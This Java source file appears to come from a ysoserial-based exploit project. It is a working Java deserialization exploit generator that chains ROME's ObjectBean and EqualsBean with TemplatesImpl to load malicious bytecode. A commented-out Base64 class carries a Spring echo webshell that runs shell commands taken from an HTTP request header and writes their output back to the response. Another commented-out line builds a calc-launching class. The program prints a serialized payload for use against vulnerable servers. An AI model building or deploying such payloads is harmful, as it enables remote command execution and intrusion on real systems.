package ysoserial.vulndemo;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ObjectBean;
import javassist.CannotCompileException;
import javassist.NotFoundException;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.Hashtable;

public class Rome_bypass_noShow {
    //序列化操作工具
    public static String serialize(Object obj) throws IOException {
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream objOutput = new ObjectOutputStream(barr);
        objOutput.writeObject(obj);
        byte[] bytes = barr.toByteArray();
        objOutput.close();
        String bytesOfBase = Base64.getEncoder().encodeToString(bytes);
        return bytesOfBase;
    }
    //反序列化操作工具
    public static void unserialize(String bytesOfBase) throws IOException, ClassNotFoundException {
        byte[] bytes = Base64.getDecoder().decode(bytesOfBase);
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);
        ObjectInputStream objInput = new ObjectInputStream(byteArrayInputStream);
        objInput.readObject();
    }
    //为类的属性设置值的工具
    public static void setFieldVlue(Object obj, String fieldName, Object value) throws NoSuchFieldException, IllegalAccessException {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
    //payload的生成
    public static void exp() throws CannotCompileException, NotFoundException, IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException {
        //生成恶意的bytecodes
//        String cmd = "java.lang.Runtime.getRuntime().exec(\"calc\");";
//        ClassPool classPool = ClassPool.getDefault();
//        CtClass ctClass = classPool.makeClass("evilexp");
//        ctClass.makeClassInitializer().insertBefore(cmd);
//        ctClass.setSuperclass(classPool.get(AbstractTranslet.class.getName()));
//        byte[] bytes = ctClass.toBytecode();

        //生成可以绕过不出网的spring的回显bytecodes
        FileInputStream inputStream = new FileInputStream(new File("D://浏览器下载//ysoserial//src//main//java//ysoserial//vulndemo//SpringEvil.class"));
        //byte[] bytes = Base64.getDecoder().decode("yv66vgAAADQAuQoALwBfCgBgAGEKAGAAYggAYwoAZABlCABmBwBnCgAHAGgHAGkKAGoAawgAbAgAbQgAbggAbwgATQoABwBwCABxCABOBwByCgBqAHMIAFAIAHQKAHUAdgoAEwB3CAB4CgATAHkIAHoIAHsKABMAfAgAfQgAfggAfwgAgAoACQCBCACCBwCDCgCEAIUKAIQAhgoAhwCICgAkAIkIAIoKACQAiwoAJACMCACNCACOBwCPBwCQAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABFMcm9tZS9TcHJpbmdFdmlsOwEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwCRAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAAY8aW5pdD4BAAMoKVYBAAFjAQARTGphdmEvbGFuZy9DbGFzczsBAAFtAQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAAFvAQASTGphdmEvbGFuZy9PYmplY3Q7AQACbTEBAARyZXNwAQADcmVxAQAJZ2V0V3JpdGVyAQAJZ2V0SGVhZGVyAQAGd3JpdGVyAQADY21kAQASTGphdmEvbGFuZy9TdHJpbmc7AQAIY29tbWFuZHMBABNbTGphdmEvbGFuZy9TdHJpbmc7AQALY2hhcnNldE5hbWUBAA1TdGFja01hcFRhYmxlBwCPBwBnBwCSBwBpBwByBwBTBwCTAQAKU291cmNlRmlsZQEAD1NwcmluZ0V2aWwuamF2YQwAQgBDBwCUDACVAJYMAJcAmAEAPG9yZy5zcHJpbmdmcmFtZXdvcmsud2ViLmNvbnRleHQucmVxdWVzdC5SZXF1ZXN0Q29udGV4dEhvbGRlcgcAmQwAmgCbAQAUZ2V0UmVxdWVzdEF0dHJpYnV0ZXMBAA9qYXZhL2xhbmcvQ2xhc3MMAJwAnQEAEGphdmEvbGFuZy9PYmplY3QHAJIMAJ4AnwEAQG9yZy5zcHJpbmdmcmFtZXdvcmsud2ViLmNvbnRleHQucmVxdWVzdC5TZXJ2bGV0UmVxdWVzdEF0dHJpYnV0ZXMBAAtnZXRSZXNwb25zZQEACmdldFJlcXVlc3QBAB1qYXZheC5zZXJ2bGV0LlNlcnZsZXRSZXNwb25zZQwAoACdAQAlamF2YXguc2VydmxldC5odHRwLkh0dHBTZXJ2bGV0UmVxdWVzdAEAEGphdmEvbGFuZy9TdHJpbmcMAKEAogEAB29zLm5hbWUHAKMMAKQApQwApgCnAQAGd2luZG93DACoAKkBAANHQksBAAVVVEYtOAwAqgCnAQADV0lOAQACL2MBAAcvYmluL3NoAQACLWMMAKsArAEAB3ByaW50bG4BABFqYXZhL3V0aWwvU2Nhbm5lcgcArQwArgCvDACwALEHALIMALMAtAwAQgC1AQACXEEMALYAtwwAuACnAQAFZmx1c2gBAAVjbG9zZQEAD3JvbWUvU3ByaW5nRXZpbAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAQamF2YS9sYW5nL1RocmVhZAEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwEAFWdldENvbnRleHRDbGFzc0xvYWRlcgEAGSgpTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIBAAlsb2FkQ2xhc3MBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQAJZ2V0TWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAEWdldERlY2xhcmVkTWV0aG9kAQANc2V0QWNjZXNzaWJsZQEABChaKVYBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgEAC3RvVXBwZXJDYXNlAQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBACooTGphdmEvaW8vSW5wdXRTdHJlYW07TGphdmEvbGFuZy9TdHJpbmc7KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAARuZXh0ACEALgAvAAAAAAADAAEAMAAxAAIAMgAAAD8AAAADAAAAAbEAAAACADMAAAAGAAEAAAAWADQAAAAgAAMAAAABADUANgAAAAAAAQA3ADgAAQAAAAEAOQA6AAIAOwAAAAQAAQA8AAEAMAA9AAIAMgAAAEkAAAAEAAAAAbEAAAACADMAAAAGAAEAAAAbADQAAAAqAAQAAAABADUANgAAAAAAAQA3ADgAAQAAAAEAPgA/AAIAAAABAEAAQQADADsAAAAEAAEAPAABAEIAQwACADIAAALDAAkADQAAAXsqtwABuAACtgADEgS2AAVMKxIGA70AB7YACE0sAQO9AAm2AApOuAACtgADEgu2AAVMKxIMA70AB7YACE0rEg0DvQAHtgAIOgQsLQO9AAm2AAo6BRkELQO9AAm2AAo6BrgAArYAAxIOtgAFEg8DvQAHtgAQOge4AAK2AAMSEbYABRISBL0AB1kDEhNTtgAQOggZCAS2ABQZBwS2ABQZBxkFA70ACbYACjoJGQgZBgS9AAlZAxIVU7YACsAAEzoKBr0AEzoLEha4ABe2ABgSGbYAGpkACBIbpwAFEhw6DBIWuAAXtgAdEh62ABqZABIZCwMSFVMZCwQSH1OnAA8ZCwMSIFMZCwQSIVMZCwUZClMZCbYAIhIjBL0AB1kDEhNTtgAQGQkEvQAJWQO7ACRZuAAlGQu2ACa2ACcZDLcAKBIptgAqtgArU7YAClcZCbYAIhIsA70AB7YAEBkJA70ACbYAClcZCbYAIhItA70AB7YAEBkJA70ACbYAClexAAAAAwAzAAAAbgAbAAAAHAAEAB0AEAAeABsAHwAlACAAMQAhADwAIgBIACMAUwAkAF8AJQB1ACYAkAAnAJYAKACcACkAqQAqAL4AKwDEACwA3QAtAO0ALgDzAC8A/AAxAQIAMgEIADQBDgA1AUoANgFiADcBegA4ADQAAACEAA0AAAF7ADUANgAAABABawBEAEUAAQAbAWAARgBHAAIAJQFWAEgASQADAEgBMwBKAEcABABTASgASwBJAAUAXwEcAEwASQAGAHUBBgBNAEcABwCQAOsATgBHAAgAqQDSAE8ASQAJAL4AvQBQAFEACgDEALcAUgBTAAsA3QCeAFQAUQAMAFUAAAA4AAT/ANkADAcAVgcAVwcAWAcAWQcAWAcAWQcAWQcAWAcAWAcAWQcAWgcAWwAAQQcAWvwAIAcAWgsAOwAAAAQAAQBcAAEAXQAAAAIAXg==");
        //将文件数据流转化为byte数组
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(1024);
        byte[] b = new byte[1024];
        int n;
        while ((n=inputStream.read(b))!=-1){
            byteArrayOutputStream.write(b, 0, n);
        }
        inputStream.close();
        byte[] bytes = byteArrayOutputStream.toByteArray();
        byteArrayOutputStream.close();

        //因为在TemplatesImp类中的构造函数中，_bytecodes为二维数组
        byte[][] bytes1 = new byte[][]{bytes};

        //创建TemplatesImpl类
        TemplatesImpl templates = new TemplatesImpl();
        setFieldVlue(templates, "_name", "RoboTerh");
        setFieldVlue(templates, "_bytecodes", bytes1);
        setFieldVlue(templates, "_tfactory", new TransformerFactoryImpl());

        //封装一个无害的类并放入Map中
        ObjectBean roboTerh = new ObjectBean(ObjectBean.class, new ObjectBean(String.class, "RoboTerh"));
        Hashtable hashmap = new Hashtable();
        hashmap.put(roboTerh, "RoboTerh");

        //通过反射写入恶意类进入map中
        ObjectBean objectBean = new ObjectBean(Templates.class, templates);
        setFieldVlue(roboTerh, "_equalsBean", new EqualsBean(ObjectBean.class, objectBean));

        //生成payload并输出
        String payload = serialize(hashmap);
        System.out.println(payload);

        //触发payload，验证是否成功
//        unserialize(payload);
    }

    public static void main(String[] args) throws NotFoundException, CannotCompileException, IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException {
        exp();
    }
}
